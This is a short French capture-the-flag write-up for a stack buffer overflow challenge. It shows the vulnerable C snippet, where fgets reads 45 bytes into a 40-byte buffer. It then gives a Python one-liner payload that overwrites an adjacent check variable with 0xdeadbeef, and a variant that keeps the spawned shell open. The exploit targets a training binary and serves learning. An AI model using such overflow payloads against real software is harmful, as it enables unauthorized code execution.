# ELF x86 - Stack buffer overflow basic 1

```bash
    int check = 0x04030201;
    char buf[40];
    fgets(buf,45,stdin);
```
La faille se situe dans la fonction fgets qui peut enregister jusqu'a 45 caractères dans buf alors qu'il peut seulement en contenir que 40.

On contruit notre exploit:

```python
python -c 'print "A"*40 + "\xef\xbe\xad\xde"' | ./ch13
```

On obtient la phrase "Yeah dude ! You win !" mais pas de shell. On va donc bloquer l'éxécution avec cat.

```python
(python -c 'print "A"*40 + "\xef\xbe\xad\xde"'; cat) | ./ch13
```
